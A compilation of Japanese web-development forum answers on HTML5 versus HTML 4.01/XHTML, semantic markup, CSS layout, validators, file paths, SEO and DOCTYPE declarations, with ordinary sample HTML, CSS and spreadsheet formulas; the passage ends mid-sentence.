■他のタグにしたいのですが、どのようなタグが適切でしょうか？ ビルダーで未知のタグとなるのは、おそらくあなたがDLしたテンプレートがHTML５で作成されているためです。 ビルダーがHTML5に対応できていないために未知のタグと判断しているようです。 それらをHTML 4.01 Transitionalで適切に書き換えたいのであれば、HTMLとCSSの編集が必要になりますが大丈夫ですか？ 一例を挙げるなら <nav></nav>　となっているところを <div id="nav"></div> と書き換え CSSファイルの nav　｛　hogehogehoge;　｝ となっているところを #nav　｛　hogehogehoge;　｝ と書き換えるといった感じです。 編集はいろいろと大変でしょうが、がんばってください！
<!－－　saved from url=(0013)about ：internet- -> は、ＰＣ上のHTMLファイルを直接ブラウザで見るときに使うもので、ウェブサイトにＨＴＭＬをアップロードするのであれば、全く関係ありません。不要です。
＞＞HTML5で、一番の打撃を受けるのはオーサリングツールではないかと・・・。 ＞こちらは、Dreamweaverのようなソフトの事ですよね？前々から独自のタグを加えると ＞いうことは聞いていましたが、 　実は、XHTMLを作成するほうがオーサリングツールは楽なのです。XHTMLはXMLで書かれているため、機械的な処理がはるかに楽だからです。 　独自のタグ---これは、XHTMLのほうの説明です。この説明は省きます。 　HTML4.01では、終了タグを省略できる要素<p><li>・・もあり、それ以上の意味はありませんでしたが、ブラウザ、オーサリングツールがその文書を解析するためのルールは決められていませんでした。XHTMLでは、そもそもそれを否定して処理を目指し、HTML5では、その解釈方法まで決めることにした。 　いずれを選ぼうと、ブラウザもオーサリングツールもその意味では楽になるし、著者も互換性に悩む必要もなくなるでしょう。 　「セマンティクなマークアップをしろ」と言われると、オーサリングツールを使う人間自身が文脈や文意を解釈する必要があります。ある文書の中でそれがarticleなのかsectionなのかasideか、はたまた、figureなのかは、著者自身が決めなければなりません。ある文書の中で、それがどのような要素であるかを知ることができるのは、今のところ人間の頭脳を使うしかないということです。それが出来れば、わざわざツールの力を頼らなくてもテキストエディタで、<aside></aside>と書けばよい。 　また、そんな様々な要素で組み立てられた文書の中のある要素をスタイルシートでプレゼンテーションを決めたい場合、たとえば本文-章(section)中の各項目(section>section)中のfigure要素については、0.9emのサイズで本文の右にフロートさせたいと言う場合、オーサリングツールでそれをしようとすると、その部分をidで指定して配置することになります。それが文書に一箇所しか登場しないならそれで良いですが、今後何箇所も登場するとなると厄介です。なぜなら、オーサリングツールは、未来を予測できませんから・・。 　となると著者自身がそのようにHTML <body> 　<section> 　　<section> 　　　<figure> 　を作成して、スタイルシートも、 section>section figure{} と指定しなければなりません。そうすると、オーサリングツールで作成するよりはるかにシンプルで、後日メンテナンスも極めて楽になるでしょう。 　この二点がオーサリングツール・・・というよりオーサリングツールに頼っての製作の打撃になるでしょう。オーサリングツールは、videoやcanvas、SVGの作成---これは手で書くのは無理----に任せ、HTML自体のマークアップやCSSの製作は著者自身が製作する形にならざるを得ないでしょう。 ＞現時点で、ソフトを使わなければ、自分の力量では難しいかな？という感じです。 　HTML自体のマークアップは、「HTML5の仕様書」や「HTML5 における HTML4 からの変更点 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )」を読めば難しくは無いでしょう。HTML自体は、もともと人がマークアップすることを目的に作成されています(XMLと違い)から。HTML5では、「著者が使えるもの」と明確に決められましたし、XMLと異なり、様々な書き方が出来ますからHTML4.01よりはるかに簡単になったと思います。 　video,canvas,audio,SVGは、オーサリングツールに任せればよい。 ＞それとHTML5に関しての、ORUKA1951様のオススメの書籍など情報があれば教えて頂ければ 　こちらが難題、進歩の早い世界ですから半年前の最先端が気がついたら陳腐な話になっている。昨日まで世を挙げてXHTMLと言っていたのに、気がついたらHTML5です。(^^) 　私は基本的には、ネット上の情報を追いかけているのが現実です。それでもあえてと言われれば ・HTML5&API入門: 白石 俊平, 株式会社あゆた: 本 ( http://www.amazon.co.jp/HTML5-API%E5%85%A5%E9%96 … ) ・徹底解説HTML5マークアップガイドブック: 羽田野太巳: 本 ( http://www.amazon.co.jp/%E5%BE%B9%E5%BA%95%E8%A7 … ) ・・・・などかな? 基礎知識としては ・連載インデックス「HTML5“とか”アプリ開発入門」 - ＠IT ( http://www.atmarkit.co.jp/fwcr/design/index/inde … ) とか 　現状では、資料の豊富なHTML4.01strictをしっかり身に着けるとに、「HTML5 における HTML4 からの変更点 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )」のセマンティクな要素の使い方を参考にして、HTML4.01strictをつくってみるのが良いでしょう。 <body> 　<div class="header"> 　　<div class="hgroup"> 　　　<h1></h1> 　　　<h2></h2> 　　</div> 　　<div class="nav"> 　　</div> 　</div> 　<div class="section"> 　　<h2></h2> 　　<p><p><p>・・ 　　<div class="aside"> 　　</div> 　</div> 　<div class="footer"> 　</div> </div> 　
そんなあなたなに！ すべてを満たす、aptana　studio　３　がお勧めです。 HTMLの入力サポート、CSSの入力サポート、オートインデントはもちろんリアルタイムにエラーを検出する機能。 最近のバージョンでは、プレビュー画面が一体化してさらに使いやすくなっています。 Aptanaはeclipseというソフトを元に作られたソフトなので日本語版がないですが、 （日本語化することはできます） HTMLとCSSの編集においてはDreamWeaverと同等かそれ以上の使いやすさ（＆機能）があります。 javascriptもphpもいじれますが、残念ながらphpのデバック機能がまだ組み込まれていません。 無料なので試してみるといいかもしれませんね。
strictだと、例えばtarget属性が使えません。 あなたが上げたサイトはほとんどtarget属性が使われていました。
Yahoo知恵袋に似たような話が載っていますがこれでどうでしょうか。 C-MAPはクリッカブルマップを簡単に作成するソフトであり、細かい指定(CSSなど)は HTML本体に記述すれば動くようになるかもしれません。 参考URL：http://detail.chiebukuro.yahoo.co.jp/qa/question …
No.1 お礼より： > XHTMLで宣言しているのにContent-Typeをtext/htmlで提供する理由 XHTML 1.0 が出た頃、それをちゃんと XML として処理できるブラウザはほとんどありませんでした。ですから、XHTML を XML として処理できる新しいブラウザが出るまで、XHTML を HTML と同じように扱う必要があったのです。 しかし、当初は 2000 年に勧告予定であった XHTML 2.0 の策定が遅れに遅れ、様子を伺っていたブラウザ開発者が XHTML の未来に懐疑的になります。Mozilla/Firefox は早くから XHTML モードを備えていましたが、XHTML を扱えない IE6 が 5 年以上も最大シェアを占めたこともあり、XHTML がウェブでその実力を発揮する機会は訪れませんでした。 ※IE5 から XML 処理は可能でしたが、ウェブページとして表示するには HTML 処理が必要でした。 結局、ブラウザ開発者を中心に HTML5 が提唱され、XHTML 2.0 は 2009 年に打ち切りになりました。 --- XML の必要性が薄れたわけではありません。例えばセマンティック・ウェブの分野では、ブラウザ表示以外の用途でデータをやり取りするために、どうしても XML のような標準・汎用的形式が必要になります。 だから本当は XML 界隈とウェブを統一できれば良かったのに、歴史的なゴタゴタのせいで、逆に XML 界隈とウェブが乖離してしまったということです。まあ、境界がはっきりしてれば、それはそれでやりようがあるんですけどね。私は XML を使う機会が多いので、ソースを XHTML で書き、ウェブに公開するときに HTML5 に変換しています。 ブラウザ表示だけが目的なら、最初から HTML5 で書くのが（今は）無難でしょう。今後のブラウザは、どの (X)HTML バージョンで書かれたものであろうと、text/html である限りは HTML5 のルールで解釈します。"/>" でなくとも表示に影響しないのはそのためです。 『XHTML を HTML と同じように扱う必要があった』時代を未だに引きずりながら XHTML 1.x を書いている人が（あるいは入門書や解説書も）多いのですが、それは決して本来意図された道筋ではありません。良い加減、考え直すべきだとは思います。
1.特許出願をしていた場合は特許権。 2.「十分に修正／改変した上」の内容によりますが、「無断でコピーして」のコピーしたことが 明確にわかる状態ならば著作権の侵害のはず。 例えば、copywriteの文言がもとのままだったとか。 （普通は消しているだろうけど。ソース全体で絵文字のようにしてあるとかだとそのままかも。 ・・・うまく作れるかどうかは別として。）
その、参考にした「大きなサイト」のソースを見るのが確実だと思いますが… 空白のTEXTAREAを作りたいなら <TEXTAREA rows="10" cols="50" name="body"></TEXTAREA> です。 <TEXTAREA>～</TEXTAREA>の間に改行を入れてはいけません。
tableを使うべきなのか？ 何の為のtextareaなのか？ rows="10" cols="50" って事かな。 画像は背景にしたいのかな？ <textarea rows="10" cols="50" name="test" style="background:url(test.gif) no-repeat;"> test </textarea>
あ。さっきの同じ質問者って事は、質問を見る順が逆だったか・・・ -------------------- 画像に幅 width を設定する。 その width と同じ幅をセルに設定する。 <table width="100%" border="1"> <tr> <td style="width:100px;"> <img src="test.jpg" width="100"> ～以下省略 heightもaltも必要。　表で無ければ、tableは使わない。 表を使わない方法を考えた方（作わないよう努力すれば）が、 将来的にキレイに作れるようになるでしょう。
外部CSSだとこれかな？ http://questionbox.jp.msn.com/qa4845100.html
No. 3 の補足 > 1点可能であれば、container2自体を追加しないで同じ動作となることは可能でしょうか？ 一応可能ですが、ボックスを追加する場合よりも複雑な記述になります。 また、IETesterのIE7モードで表示が乱れました。更新ボタンで正常な表示になりましたが、実際のIE7での表示に不安を持っています。 Fx6, GC11, IE6, IE8は正常、IE9は未確認です。 ◆ 修正案 (HTML) 変更なし (CSS) #container { /* background-color: #FFFFFF; */ background: #fff url("幅200px.gif") repeat-y left top; /* 追加：メニュー部背景 */ overflow: hidden;/* 追加：for IE6以外 */ } * html #container {/* 追加：for IE6 */ overflow: visible; display: inline-block;/* 下と重複するが省略できない */ } * html #container {/* 追加：for IE6 */ display: block; } #header { background: #fff; /* 追加：メニュー部背景を隠す */ } #main { /*padding: 0px 0px 0px 0px;*/ padding: 0px 0px 10px 0px;/* 変更：footerの高さと同じ */ } #side { /*padding: 0px 0px 0px 0px;*/ padding: 0px 0px 10px 0px;/* 変更：footerの高さと同じ */ } #footer { left: 0;/* 追加 */ }
＞仕様書と言うのは、本屋に置いてある物でしょうか？ 　No.2の回答に記した引用文のリンクがそれです。すべての仕様書は公開されています。 --仕様書を読んでいれば、わざわざ本を書く必要は無く「仕様書を読みなさい」ですむし、自己流の回答をすることもない---だから良い参考書が無いのですが・・・だって読んでないか知らないから書ける・・・ HTML 4.01 Specification (ja) ( http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … ) 　その他、 W3C - W3Cの仕様書等の文書の日本語訳集 ( http://www.w3.org/Consortium/Translation/Japanese ) 　titleについては、HTML4.01の仕様書には珍しく厳しい言葉で「著者は文脈を踏まえたタイトルを提供する必要がある。」と書かれています。そりゃ、制限速度４０km/hの道路を120km/hで走ろうと『自由』ですが、いくら罰則が無いとは言え、一度でも仕様書を読んでいれば『自由』と言ってはならないでしょう。 　仕様書の中でも特に「HTMLの略歴」や「スタイルシートの概略」は読んでおくほうが良いでしょう。HTMLをデザインのために書いてしまう失敗を犯さないためにも。 　そして、HTMLを書いたら Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) The W3C Markup Validation Service ( http://validator.w3.org/#validate_by_input ) 　CSSを書いたら W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) 　でチェックする癖をつけると良いです。
　HTMLではなく、スタイルシートの問題ですね。その端末は、CSS2.1に対応していますから、単純にCSS2.1で指定すれば良いです。 　tableは本来、可能な限りウィンドウ幅に合わせて描画し、内容の量に応じてセルの幅を割り振ることになっています。そうしないと困るからです。 　デザインのためにtableを使うのは、HTML4.01の時代から禁忌ですから別にします。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから Tables should not be used as layout aids. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.9 Tabular data — HTML5( http://www.w3.org/TR/html5/tabular-data.html#tab … )］より 　 　ブロック要素の高さは、height,min-height,max-heightで指定され、基本的に親要素の高さを参照します。 10.6.3 通常フローにある非置換ブロック要素、非置換浮動要素の場合 ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) <table summary="toA"> 　<tbody> 　　<tr > 　　　<td></td> 　　　<td></td> なら、 table[summary="toA"] td{height:80px;oveflow:hihhen;}
SSIで出力されたときのHTMLを調べてください。答えはそこにあるのは明白ですから・・ そのURLをValidatorやAnothe HTML lintで調べたり、fireBugでスタイルシートとあわせてチェックする。
ウェブ限定ではないですが、ネットがらみでのげーむの紹介が掲載ているのがコチラ。 「ｉＰ！」 http://www.amazon.co.jp/iP-%E3%82%A2%E3%82%A4%E3 … 掲載内容の中には「全てJavaScript製」なんてのもあります。 ということで、JavaScriptは基本的にブラウザがあれば動作してくれるので JavaScript本で、私的直感にてひとまず立読みしてみようと思った本がコチラ。 「JavaScript 2 Webアプリケーションの基礎とJavaScriptを使ったプログラミングテクニック (CD-ROM付) 」 http://www.amazon.co.jp/JavaScript-2-Web%E3%82%A … 「JavaScript,Ajax,DOMによるWebアプリケーションスーパーサンプル」 http://www.amazon.co.jp/JavaScript-Ajax-DOM%E3%8 … 「プログラミング問題集1 JavaScript版 空の巻 」 http://www.amazon.co.jp/%E3%83%97%E3%83%AD%E3%82 … 「プログラミング問題集2 JavaScript版 海の巻 」 http://www.amazon.co.jp/%E3%83%97%E3%83%AD%E3%82 … 実際には、本屋で見つけたものの目次を見る程度しかしていなかったりするのはナイショです。 JavaScriptでプログラムの概念というか、ロジックの組み方が分かってから PerlかPHP辺りを覗いてみるか、Javaのコッテリさを堪能するか 微妙に有名なRubyに突っ走るのか？ ソフト作りには、そのものずばりな 「日経ソフトウェア」 http://www.amazon.co.jp/%E6%97%A5%E7%B5%8C%E3%82 … もあります。 さて、どのトビラから開けてみますか？
極簡単なソースですが ★Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) ★W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) で検証済み ＿はタブに戻してください。 スタイルシート内のurl()内には、画像(400px×300px程度)の適当な画像へのパスを書いてください。 補足)画像の位置をクリックすると少しずらすとかも出来ます。調べてください。 補足)別ページが開く方法はjavascriptを使いますが、出来ればユーザーに任せたほうが良いです。 　　右クリックで現れるコンテキストメニューで新しいウィンドウなり、タブで開けますからね。 　　^^^^^^^^^^^^^^著者が制約しないほうが良い^^^^^^^^^^^^^^^^^ <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- div.nav{background-image:url();width:400px;height:300px;position:relative;} div.nav ol,div.nav ol li{display:block;list-style:none;text-align:center;} div.nav ol li{width:100px;height:50px;position:absolute;line-height:50px;} div.nav ol li a{display:block;width:100%;height:100%;border:outset 5px gray;text-decoration:none;} div.nav ol li.goTop{top:50px; left:100px;} div.nav ol li.goTest1{top:150px; left:200px;} div.nav ol li.goTest2{top:200px; left:350px;} div.nav ol li a:hover{border-color:red;} div.nav ol li a:active{border-style:inset;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>サンプル</h1> ＿</div> ＿<div class="nav"> ＿＿<ol> ＿＿＿<li class="goTop"><a href="./index.html">トップ</a></li> ＿＿＿<li class="goTest1"><a href="./test1.html">テスト１</a></li> ＿＿＿<li class="goTest2"><a href="./test2.html">テスト２</a></li> ＿＿</ol> ＿</div> </body> </html>
SEOはすでにやってらっしゃるんですよね？ であれば、もう手は尽くしたのではないかと…。 やはりSEOで基礎的なのは、 ・tableタグでデザインせずDIVを利用する ・TITLEタグ内、つまりサイトのページ名をよく考える ・強調文字にはstrongタグを用いる、 ・h1～h2あたりを効率よく使う、 ・本文中のキーワード率をよく考える、 ・リンク数を増やす ・自サイトコンテンツへの内部リンクに相対アドレスを用いない これくらいになります。あとはその比率や文字選びのセンスですね。 最低限これを徹底すれば、検索エンジン対策はできていると言えます。 一番重要なのはリンクされている数ですが、今上位に出ているなら十分でしょう。 ではそのほかの要素はどうでしょうか。 デザイン性も大切ですが、使いやすさはいかがですか？ 昨今、デザイン性だけのデザイナーのオナニーサイトが増えていますが、 そういうサイトはいわゆる『名刺サイト』になるので、 『情報を求めてくる』という大半の性質を持つユーザーにとっては、 とてもとても邪魔なイメージになります。 もちろんデザイン性も欠けてはならないものですが、 情報量＞使いやすさ＞デザイン性 こういう重要性で作られているサイトで、 かつそれがユーザーにも第一印象でパッとわかるサイトつくりが重要です。 いくら使いやすくても情報が少なくてかっこ悪いならお気に入り登録しません。 かっこよくて情報量があっても、引くくらい使いにくいとお気に入り登録しません。 やはり、上記３つはすべて必要ですが、バランスも大切なのです。 と、散々書きましたが、これはあくまで一般的なサイトの話ですね。 情報量という意味では、サッカーチームのサイトでは難しいでしょう。 なんどもアクセスしたくなる情報か？といえば、 定期的に一度見れば満足するような情報だらけでしょうし…。 サッカーチームのwebサイトのアクセス数、 とすれば現在でも良いほうなのではないでしょうか？ サッカーチームのwebサイトというのは性質上、 活動履歴や、これからの活動予定情報、選手プロフィール、 ファングッズの販売情報、試合結果、ファン同士の交流掲示板、 選手のBLOGとツイッターくらいしかアクセスする理由はないと思われます。 どう考えても、それらが目的でアクセスしているはずなんです。 それらで定期更新するものといえば、 活動履歴、予定、販売情報、試合結果、BLOGとツイッターでしょう。 新規ユーザーのうち、webサイトに対する固定ユーザーは何人になるでしょうか。 正直、BLOGとツイッターを選手が始めたとしても、 固定ユーザーは直接BLOGとツイッターをお気に入り登録しますし、 『webサイトのアクセス数』は伸びませんしね。 実質webサイトのアクセスを稼ぐには、 活動履歴、予定、販売情報、試合結果、これしかないはずです。 交流する人にとっては掲示板も有効なコンテンツですが、 これは本当にコアなファンしか活用しないので、 アクセスを稼ぐ、というのとは違うベクトルになるでしょうし。 そして、それらの情報は、何度も確認しなくていい情報です。 一度見れば、それで満足しちゃうのです。性質上の問題です。 選手からコメントを定期的にもらってインタビューをするくらいしか、 webサイトの新たな価値、というのは見出しにくいと思います。 blogやツイッターのほうが本人の地の声が聞けますから、 よほどうまいつくりじゃないと意味はないかもしれませんが。 いずれにせよ、アクセス数は十分あると思います。 どんなに好きなものでも、ファンでも、 毎日かかさずアクセスするなんてことはよほどコアなユーザーです。 よくて数日に1回のアクセス、せいぜい週1回ではないでしょうか。 そう考えれば、1万人のサポーターという背景、 1日20～80人程度のアクセスというのも妥当だと思われます。 私の個人サイトは年間300万ユニークアクセスありますが、 情報量のある、特定の趣味に通じたサイトになっています。 しかしそれは「非常にポピュラーな趣味」という大枠のカテゴリーだからです。 「特定のサッカーチーム」という小さなカテゴリーでは、 きっと私が運営してもアクセス数はそれほど稼げないと思いますよ。 あと、webサイトを見よう！という発想に結びつかない人も大半でしょう。 サポーターはweb以外にも試合情報を共有したり、チケットを買えるはずです。 試合を見る、という事に重きを置いていて、webまで見る人は半数以下ではないでしょうか。 いや、半数以下ってのは単なる想像ですが、 とりあえずweb、という結びつきができる人間は、 PCが好きな人か、よほどコアなユーザーか、どっちかだと思います。 やっぱり試合を見るだけで満足している人は多いと思いますね。
No.2 のお礼より： > iframe も JavaScript も使わず、XHTML+CSSで記述したコードを、クローラーに上から下に向かってシンプルにparseさせるのが一番に決まってます 質問からの流れからして、ここでの『一番』とは『iframe も JavaScript も使わず』です。別に XHTML だからどうこうとは言ってないと思います。 なお、iframe 要素の見解についても私は議論の余地があると思います。iframe 要素は中に代替内容を記述できます。例え埋め込み表示はできずとも、代替内容に a 要素でも書いておけば、利用者（クローラを含む）は普通にリンクをたどれるはずです。つまり、この場合に問題があるのは iframe 要素自体ではなく、ダメな iframe 要素の使い方、ということになります（むしろ、この点に全く触れられていないことに吃驚です）。 # フォーム、印刷、ブックマークなどの問題については触れません。 また、XML ならシンプルにパースできるかもしれませんが、正直なところ Web 上の XHTML ページが整形式であるとはあてにできませんので、何だかんだでエラー処理を通すことにはなります。結局、最初からエラー処理を含む HTML パーサと大して変わりません。最初から XML 界隈のデータだけを対象にするサービスなら別でしょうが。
site:☆☆☆MySite★★★.Website.FC100.com/MyPage.html ではなく、 http://☆☆☆MySite★★★.Website.FC100.com/MyPage.html これで検索すれば良。 もしくは、 http://www.bing.com/toolbox/webmaster/ ウェブマスターツールで管理 というかBing対策なんて時間の無駄では？・・・
Windows以外は、ひとつ上位のディレクトリは、../です。./は現在(カレント)のディレクトリ。 「アップロード先が変わることも考え」る場合は、基本的にルートからの絶対パスを書きます。 　/images/Logo/top.gif だと、そのHTMLをどこに移動しても有効です。もし相対パスで 　../images/Logo/top.gif としていたら、違う階層にアップロードしたら役に立ちませんね。 /books/test.htmlをbooks/book1/test.htmlに移動した場合 /　　　　　ルート |-- index.html |-- books/ |　　　|-- test.html <img src="../images/Logo/top.gif"> |　　　|　　・　　　これは、[ルート]/images/Logo/top.gifと言う意味 |　　　|　　・　　　　 <img src="/images/Logo/top.gif"> |　　　|　　　　　　これも、[ルート]/images/Logo/top.gifと言う意味 |　　　|　　　　　 |　　　|-- book1 |　　　|　　　|-- test.html <img src="../images/Logo/top.gif"> |　　　|　　　　　これは、[ルート]/books/images/Logo/top.gifと言う意味 |　　　|　　　　　で、それは存在しない無効!! |　　　|　　　　　　 <img src="/images/Logo/top.gif"> |　　　|　　　　　これは、[ルート]/images/Logo/top.gifと言う意味で有効 | |-- images |　　　|-- Logo |　　　　　　|-- top.gif 　ただし、絶対パスで記述するとローカルサーバーが無い場合は、機能しない場合があるので注意してください。 「htmlの現在のフォルダ位置、ないしtopページのあるフォルダ位置が分かる方法」はありません。 　あくまで、ブラウザがURLを見て判断するだけです。たとえば http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/ABC/v … 　と、ABC以下(ABCも)をどのようなディレクトリ(パス)やファイル名にしても、あたかもそのディレクトリやファイルが実在するように表示されますが、現実には存在しません。現実のカレント(現在のディレクトリ名)や、トップの位置は、このプログラムのように他の手段に頼らないと無理です。--具体的にはサーバーのコンピューターの環境変数のDOCUMENT_ROOTやSCRIPT_NAMEを参照します。 　環境変数:Windowsだと、マイコンピューター→プロパティ→詳細設定→環境変数にあたる。 　 　
簡単に変更できるHTML、CSSじゃないですね。本当に酷いものです。 DIVを多用して文書構造を無視してHTMLが作成してある。 CSSのためだけにIDを指定して、カスケーディング機能(CSSの最も重要な仕組み)が無視されている。 それは無視して、最初から作り直しましょう。そもそもHTMLは『文書をそれを構成する要素に分解してその要素をマークアップするHyper Text Markup Languageです。』 　したがってDIVについても 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　と書かれています。ここでいう構造はデザインではなく、それが、その文書を構成するどんな要素であるかをidやclass名でつけるのですから、<div class="header"><div class="section">とかのはずですね。<div class="col1">なんて書かれていたら検索エンジンは無論、あなただって半年後には、そこに何が書かれているかの構造を理解できなくなる。そのようなHTMLはtableでデザインするのと変わりません。 「col1が155px,col2が14px,col3が382px,col4が14px,col5が190px」・・随分と細かい数字ですが、トップのバナー部分か何かですか？だとしたらHTMLは <div class="header"> 　<h1><span>見出し</span></h1> 　<div class="nav"> 　　<p><img src="./imges/LOGO/top.gif" class="topLogo" alt="トップへ"></p> 　　<p>なんたらかんたら</p> 　</div> 　だけで済むはずです。・・これなら、あなたは無論、検索エンジンもこの部分がヘッダー部分で、簡単なナビゲーションを含むことが理解できる。数年後にソースを見直してもね。それがDIVにidやclass名をつけて構造を示すの意味です。 　当然CSSもずっと簡単になって、しかもHTMLを開かなくても何をしているかわかる。変更も自由自在・・。 div.header{ /* headerのデザイン[詳細度0,0,1,1] */ min-height:160px;/* ロゴの画像サイズ(高さ) */ width:100%; position:relative; background-color:#eeeeee; } div.h1{ text-align:center; background:url([バナーの画像URL]) 50% 50% #FAA; margin-left:155px; padding:0 14px; } div.p{/* header内のpのデザイン[詳細度0,0,1,1] */ position:absolute; margin-left:565px; width:190px; background-color:aqua; } div.header div.nav img.topLogo{ /* header内のnavのimgデザイン 詳細度[0,0,3,3] */ /* header(relative)を基準に絶対配置 */ top:0;left:0; } 位で済むはず。 　そのようにデザインしたくなるということは、それぞれのブロックに何らかの文書構成上の意味があるはずです。それにしたがってHTMLを書くこと--デザインのためにHTMLを書かない。デザインは無視する。 　その上でスタイルシートを書けば、後であなたがどのように変更したいと思っても自由になるはずです。縦に並べようが、ロゴを逆に配置しようが・・
IEは知らないけど Firefoxになら「DOM Inspector」という拡張があって 表示されてるHTMLやらの情報を調べることができるよ https://addons.mozilla.org/ja/firefox/addon/dom- …
実に様々な携帯電話もあり、ブラウザも色々、そして最近ではi-phoneとかのスマートフォンもあります。 　そのため、いちいちページを作成していたら手間が大変ですし、振り分けも大変です。 　実はそのために、HTMLがあるのです。【最も重要なここを忘れてませんか】 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 もし【相互運用性確保の】努力が成されなければ、Webは互換性のないフォーマット毎に分け隔てられた世界に分割され、すべての関係者にとっての商業的可能性が減少することとなるであろう、大きなリスクを負うこととなる。 　どのバージョンのHTMLも、コンテンツプロバイダの投資が無駄にならないよう、また短期間で文書が読み取り不能となったりすることがないよう、産業界の幅広い賛同を反映するようにされてきた。 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　きちんと、ウェブ標準(仕様書どおり)に作成すれば、（携帯電話をもとより、プリンター用、読み上げソフト、検索エンジンとか）そもそも振り分けの必要がないのですよ。必要ならスタイルシートを書いて置きゃよい。 　何のためにHTMLでページをつくるのか？それは、「どんな環境からもWebの情報を利用できるようにすべきだ」からじゃないですか？ 　その上で、 <link rel="stylesheet" type="text/css" media="screen" href="[スタイルシートのURL}"> <link rel="styleSheet" type="text/css" media="handheld" href="[PDAなど]"> <link rel="styleSheet" type="text/css" media="tty" href="[携帯電話用スタイル]"> <link href="pc.css" rel="stylesheet" type="text/css" media="screen and (min-device-width: 481px)"> <link href="iphone.css" rel="stylesheet" type= "text/css" media="only screen and (max-device-width: 480px)"> とかで・・・ 　印刷用スタイルシートなどと同じです。読み上げソフト用スタイルシートとか・・
回答No1です。 ご質問の意味をよく理解しないままに答えているかもしれません。 もしも、ダブりのない状態でURLの番号(A列)をE列に表示させるとしたら、E2セルには次の式を入力して下方にオートフィルドラッグします。 =IF(A2="","",IF(COUNTIF(C$2:C2,C2)=1,A2,"")) それともダブりのない状態でURLを並べることを目的としてE列に上から番号を振るとしたらE2セルには次の式を入力して下方にオートフィルドラッグします。 =IF(A2="","",IF(COUNITIF(C$2:C2,C2)=1,MAX(E$1:E1)+1,"")) シート2にダブりのない状態でシート1からのデータを表示させるとしたら、シート1のE列で上から1，2，3と番号が振られている場合でしたら、シート2のA2セルには次の式を入力してC2セルまで横方向にオートフィルドラッグしてから下方にもオートフィルドラッグします。 =IF(ROW(A1)>MAX(Sheet1!$E:$E),"",INDEX(Sheet1!$A:$C,MATCH(ROW(A1),Sheet1!$E:$E,0),COLUMN(A1)))
faviconは、ico(アイコン)ファイルです。 もともとIEのブックマーク用の機能ですが、現在はサイトのアイコンとして多くのブラウザが対応しています。 ファーマットは ICO形式：複数の色数と解像度（16x16と32x32の4ビット16色、8ビット256色、24ビット1600万色、さらにWindowsでは24x24, 48x48, 64x64[1]、Mac OS Xなどで利用される64x64と128x128サイズのものを任意の色数）を保存したものをマルチアイコンとして保存してあり、拡張子はICOです。 Favicon - Wikipedia ( http://ja.wikipedia.org/wiki/Favicon )より。 よって、アイコン作成ソフト(フリーのものもたくさんあります)で、作成してください。
404 Not Foundと出ていますね。 このエラーは指定のディレクトリ、もしくはファイルがありませんというエラーです。」 ちなみにこちらが参考になると思います。 http://detail.chiebukuro.yahoo.co.jp/qa/question … 確認してみてください。
一応、念のため。 > PUBLIC "-//w3c//DTD XHTML1.0 Transitional//EN" おそらく PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" だと思われます。所有者を示す "W3C" は大文字、"XHTML" と "1.0" の間に空白が必要です。その後に続くのは、何でも良いのですが、たいていは "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitio … です。 これは要するに、この文書の設計図（DTD）の在処を示すものです。設計図は、文書のミスをチェックするのに必要です。 PUBLIC で示されるものは「W3C が作った XHTML 1.0 Transitional という設計図」の意味で、設計図が手元にあればそれを使うも良し、なければ探しに行くも良し、とにかく同じ設計図なら何でも良い、ということです。その後ろに続く URL は、そこに行けば間違いなく設計図があるぞ、という意味です。名前空間ではありません。 ネットにつながっているなら指定の URL まで設計図を取りに行っても良いし、ネットにつながっていなければ手元にある設計図を使っても良い。柔軟にやってくれ、ということです。 --- さて。XML は「設計図」なしで、いきなり文書を書いても良い。たいていの場合、設計図を後から用意しても十分に間に合うからです。設計図の在処を示す DOCTYPE 宣言が不要になった、というのが XML の大きなウリです。 ではなぜ、みんな XHTML 1.0 文書で律儀に DOCTYPE 宣言を書いているのか。それは、XHTML 1.0 が HTML 4.0 からの移行措置だったからです。HTML 4.0 までは DOCTYPE 宣言が必須だったので、いきなりなくすと困る人がいるかもしれない。もし XHTML への移行が完全に終わっていたなら、今ごろ DOCTYPE 宣言なぞ必要なかったのです。 しかし、現実はそううまくいかず、ブラウザ開発者もページ制作者も、なぜか DOCTYPE 宣言を残す方を「歓迎」しました。面倒くさがりの私としては残念ですね。 --- で、XML 宣言について。XML/XHTML 文書と、XML でない HTML 